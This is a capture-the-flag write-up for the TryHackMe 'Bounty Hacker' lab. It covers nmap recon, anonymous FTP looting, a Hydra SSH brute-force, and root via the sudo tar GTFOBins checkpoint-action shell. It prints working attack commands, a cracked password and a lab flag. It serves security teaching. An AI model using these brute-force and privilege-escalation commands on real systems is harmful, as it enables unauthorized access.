# Bounty Hacker - TryHackMe Writeup  

**Author:** Koushiq Murad  

> **Difficulty:** Easy  
> **Category:** Web / Linux / PrivEsc  
> **Goal:** Gain user & root flags

---

## 🧩 Room Overview
**Bounty Hacker** is a beginner-friendly CTF that mirrors a small real-world engagement: reconnaissance, enumeration, credential attack, SSH foothold, and privilege escalation via a sudo misconfiguration.

> ⚠️ **CTF Etiquette:** Avoid publishing full flag values in public writeups. Below I mask the root flag and keep the user flag as seen in-session. Adjust to your preference.

---

## 🔧 Lab Setup
- Attacker: **Kali Linux** (VM)  
- Connection: **TryHackMe OpenVPN**  
- Target: THM instance `10.10.xx.xx` (IP varies per deployment)

---

## 🔎 Step 1 — Recon with Nmap
Identify open ports & service versions.

```bash
nmap -sC -sV -oN bounty_scan.txt 10.10.xx.xx
```

**Flags:**
- `-sC` — run default scripts (great baseline enumeration)
- `-sV` — detect service versions
- `-oN` — save output to a file

**Findings:**
- **21/tcp FTP** — `vsftpd 3.0.5` (anonymous login allowed)
- **22/tcp SSH** — `OpenSSH 8.2p1`
- **80/tcp HTTP** — `Apache 2.4.41`

---

## 📂 Step 2 — Enumerate FTP
Anonymous login and loot collection.

```bash
ftp 10.10.xx.xx
# username: anonymous
# password: <press Enter>
ls -la
get task.txt
get locks.txt
bye
```

---

## 📝 Step 3 — Loot Analysis
- `task.txt` → reveals **username**: `lin`
- `locks.txt` → a **password wordlist** (likely for SSH)

---

## 🔐 Step 4 — Brute-force SSH (Hydra)
Use the leaked wordlist against SSH.

```bash
hydra -l lin -P locks.txt ssh://10.10.xx.xx -t 4
```

**Result (example):**
```
[22][ssh] host: 10.10.xx.xx  login: lin  password: RedDr4gonSynd1cat3
```

---

## 💻 Step 5 — Initial Foothold (SSH)
```bash
ssh lin@10.10.xx.xx
```

Grab the user flag:

```bash
cat ~/Desktop/user.txt
THM{CR1M3_SyNd1C4T3}
```

---

## 📈 Step 6 — Privilege Escalation
Check sudo permissions:

```bash
sudo -l
```

Output shows `lin` may run **/bin/tar** as root:

```
User lin may run the following commands on host:
    (root) /bin/tar
```

Use the **GTFOBins** technique for `tar` to spawn a root shell:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Confirm and read root flag:

```bash
whoami
# root
cat /root/root.txt
THM{<root_flag_masked>}
```

---

## 🧠 Key Takeaways
- **Recon first**: `nmap -sC -sV` quickly surfaces low-hanging fruit (anonymous FTP).
- **Loot matters**: Seemingly harmless files often reveal **usernames** and **password patterns**.
- **Hydra** is effective for **credential attacks** with custom wordlists.
- **Sudo misconfigs** + **GTFOBins** are core privilege escalation patterns.
- Keep clean notes & save outputs (`-oN`, text files) for repeatability.

---

## 📜 Commands (TL;DR)
```bash
# Recon
nmap -sC -sV -oN bounty_scan.txt 10.10.xx.xx

# FTP
ftp 10.10.xx.xx
# anonymous / <Enter>
ls -la
get task.txt
get locks.txt
bye

# Hydra SSH brute-force
hydra -l lin -P locks.txt ssh://10.10.xx.xx -t 4

# SSH access
ssh lin@10.10.xx.xx

# User flag
cat ~/Desktop/user.txt

# PrivEsc
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Root flag
whoami
cat /root/root.txt
```

---

## 🗂 Suggested Repo Structure
```
bounty-hacker-writeup/
├─ README.md                  # Short overview & links
├─ Bounty_Hacker_Writeup.md   # This detailed writeup
├─ loot/                      # (optional) sanitized artifacts
│  ├─ task.txt
│  └─ locks.txt
└─ screenshots/               # (optional) images referenced in the MD
```

---

## 📎 References
- GTFOBins — `tar`: https://gtfobins.github.io/gtfobins/tar/
- TryHackMe — Bounty Hacker (room page)
